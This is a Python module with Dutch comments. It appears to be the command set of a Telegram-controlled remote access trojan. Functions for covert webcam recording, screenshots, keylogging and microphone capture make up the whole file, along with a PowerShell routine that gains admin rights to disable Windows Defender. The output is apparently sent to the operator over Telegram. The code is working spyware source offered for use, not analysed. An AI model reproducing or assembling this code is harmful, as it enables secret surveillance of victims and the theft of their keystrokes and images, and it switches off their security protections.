# nested functies, deze functies hebben atom functies die daarbinnen aangeroepen worden
# Deze functies zijn Ready om binnen Async functies aangeroepen te worden
# de return van deze functies komen in de telegram chat
import cv2, time, subprocess, re, sounddevice, wavio
from PIL import ImageGrab
from pynput import keyboard
from atoms import *


# gebruik make_banner() en zorg ervoor dat alle tekens te zien zijn
def get_banner() -> str:
    text = make_banner()
    # re.sub zorgt ervoor dat speciale tekens te zien zijn in markdown codeblock
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

# functie die een lijst met alle commands terug geeft
def get_command_list() -> str:
    """
    Geeft een lijst met alle slash commands.
    """
    return r"""
Command Lijst:
/webcam         -   Maak een 5 seconde webcam opname
/ss             -   Maak een screenshot van het scherm
/stopdefender   -   Windows Defender uitgeschakelen
/keylog         -   luister naar keyboard toetsen totdat de gebruiker enter klikt
/listen         -   maak een 5 seconde geluidsopname
"""

# maak een video recording met de webcam
# source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
def get_camRecording():
    videoPath = save_media_to("cam", "mp4")

    # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
    cam = cv2.VideoCapture(0)

    # melden en functie stoppen als camera niet geopend kan worden
    if not cam.isOpened():
        return print("Camera kan niet geopend worden!")

    # height en width van de video bepalen
    frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/media folder
    fourcc = cv2.VideoWriter_fourcc(*'avc1')
    out = cv2.VideoWriter(videoPath, fourcc, 20.0, (frame_width, frame_height))

    # zolang de whileloop true is wordt webcam gebruikt om video te maken
    start_time = time.time()
    while True:
        ret, frame = cam.read()

        out.write(frame)

        # als de video langer dan 5 seconden wordt, stop de video
        if time.time() - start_time > 5:
            break

    # als de loop stopt de camera opname afsluiten
    cam.release()
    out.release()
    cv2.destroyAllWindows()

    # return de video filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
    return videoPath

# Maak een screenshot van het scherm
def get_screenshot():
    imagePath = save_media_to("screenshot", "png")
    screenshot = ImageGrab.grab()
    screenshot.save(imagePath, "PNG")

    return imagePath

# start keylogging. na enter maakt het een string van de lijst
def get_loggedKeys():
    # Collect events until released
    with keyboard.Listener(on_press=log_a_string) as listener:
        listener.join()
    
    send_string = ''.join(inputList).replace("'", "")

    # maak de lijst leeg voor de volgende keer
    inputList.clear()
    
    # return een list zonder aanhalings tekens
    return send_string

# https://www.geeksforgeeks.org/python/create-a-voice-recorder-using-python/
def get_audioFile():
    # Sampling frequency
    freq = 44100

    # Recording duration
    duration = 5

    # Start recorder with the given values 
    # of duration and sample frequency
    recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)

    # Record audio for the given number of seconds
    sounddevice.wait()

    audioPath = save_media_to("audio", "wav")

    # Convert the NumPy array to audio file
    wavio.write(audioPath, recording, freq, sampwidth=2)

    return audioPath

# windows defender uitzetten via python met powershell
def run_powershell_command(cmd):
    # zet admin rechten aan
    get_adminRights()

    # https://www.phillipsj.net/posts/executing-powershell-from-python/
    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
    runCommand = subprocess.run(
        ["powershell", "-Command", cmd], 
        capture_output=True, text=True
    )

    return runCommand.stdout
